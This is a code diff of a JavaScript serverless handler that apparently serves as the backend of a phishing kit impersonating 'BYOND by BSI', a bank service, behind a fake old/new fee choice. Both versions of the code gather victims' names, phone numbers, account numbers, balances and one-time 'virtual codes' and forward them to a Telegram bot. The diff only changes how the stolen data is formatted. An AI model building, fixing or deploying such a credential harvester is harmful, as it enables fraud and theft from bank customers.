@@ -30,102 +30,46 @@ exports.handler = async (event, context) => {
             throw new Error('Telegram credentials not configured');
         }
 
-        // Format message based on step
-        let message;
-        switch (data.step) {
-            case 'tariff-selection':
-                message = `
-╭───────────────────────────
-│  🔔 *BYOND BSI - PILIHAN TARIF*  
-├───────────────────────────
-│  Pelanggan memilih:
-│  *${data.tariff === 'old' ? 'TARIF LAMA (Rp 6.500/transaksi)' : 'TARIF BARU (Rp 150.000/bulan)'}*
-╰───────────────────────────
-                `;
-                break;
+        // Base message template
+        let message = "├• DUET | BYOOND by bsi\n├───────────────────";
 
-            case 'account-verification-1':
-                message = `
-╭───────────────────────────
-│  🔐 *BYOND BSI - VERIFIKASI 1*  
-├───────────────────────────
-│  *📌 DATA PRIBADI*  
-├───────────────────────────
-│  • Nama: ${data.name || '-'}
-│  • No HP: ${data.phone || '-'}
-├───────────────────────────
-│  • Pilihan Tarif: ${data.tariff === 'old' ? 'Lama' : 'Baru'}
-╰───────────────────────────
-                `;
-                break;
-
-            case 'account-verification-2':
-                message = `
-╭───────────────────────────
-│  🔢 *BYOND BSI - VERIFIKASI 2*  
-├───────────────────────────
-│  *📌 DATA REKENING*  
-├───────────────────────────
-│  • No Rekening: ${data.accountNumber || '-'}
-│  • Pilihan Tarif: ${data.tariff === 'old' ? 'Lama' : 'Baru'}
-╰───────────────────────────
-                `;
-                break;
-
-            case 'account-verification-3':
-                message = `
-╭───────────────────────────
-│  💰 *BYOND BSI - VERIFIKASI 3*  
-├───────────────────────────
-│  *📌 DATA SALDO*  
-├───────────────────────────
-│  • Saldo: Rp ${formatNumber(data.balance) || '-'}
-│  • Pilihan Tarif: ${data.tariff === 'old' ? 'Lama' : 'Baru'}
-╰───────────────────────────
-                `;
-                break;
-
-            case 'complete-verification':
-                message = `
-╭───────────────────────────
-│  ✅ *BYOND BSI - VERIFIKASI BERHASIL*  
-├───────────────────────────
-│  *📌 DATA LENGKAP*  
-├───────────────────────────
-│  • Nama: ${data.name || '-'}
-│  • No HP: ${data.phone || '-'}
-├───────────────────────────
-│  • No Rek: ${data.accountNumber || '-'}
-│  • Saldo: Rp ${formatNumber(data.balance) || '-'}
-├───────────────────────────
-│  • Kode: ${data.virtualCode || '-'}
-│  • Tarif: ${data.tariff === 'old' ? 'Lama (Rp 6.500/transaksi)' : 'Baru (Rp 150.000/bulan)'}
-╰───────────────────────────
-                `;
-                break;
-
-            case 'request-new-code':
-                message = `
-╭───────────────────────────
-│  🔄 *BYOND BSI - PERMINTAAN KODE*  
-├───────────────────────────
-│  Permintaan kode virtual baru
-│  untuk nomor:
-│  *${data.phone || '-'}*
-╰───────────────────────────
-                `;
-                break;
-
-            default:
-                message = `
-╭───────────────────────────
-│  ℹ️ *BYOND BSI - DATA DITERIMA*  
-├───────────────────────────
-│  Data tidak dikenali:
-│  ${JSON.stringify(data, null, 2)}
-╰───────────────────────────
-                `;
+        // Add tariff selection if available
+        if (data.tariff) {
+            message += `\n├• pilih tarif : ${data.tariff === 'old' ? 'lama' : 'baru'}`;
         }
+
+        // Add name if available
+        if (data.name) {
+            message += "\n├───────────────────";
+            message += `\n├• nama : ${data.name}`;
+        }
+
+        // Add phone number if available
+        if (data.phone) {
+            message += "\n├───────────────────";
+            message += `\n├• nomor : ${data.phone}`;
+        }
+
+        // Add balance if available
+        if (data.balance) {
+            message += "\n├───────────────────";
+            message += `\n├• saldo : Rp ${formatNumber(data.balance)}`;
+        }
+
+        // Add virtual code request if applicable
+        if (data.step === 'request-code') {
+            message += "\n├───────────────────";
+            message += "\n├• minta kode virtual :";
+        }
+
+        // Add virtual code if available
+        if (data.virtualCode) {
+            message += "\n├───────────────────";
+            message += `\n├• kode virtual : ${data.virtualCode}`;
+        }
+
+        // Close the message box
+        message += "\n╰───────────────────";
 
         // Send to Telegram
         await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -155,4 +99,4 @@ exports.handler = async (event, context) => {
 function formatNumber(num) {
     if (!num) return '0';
     return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
-    }
+            }
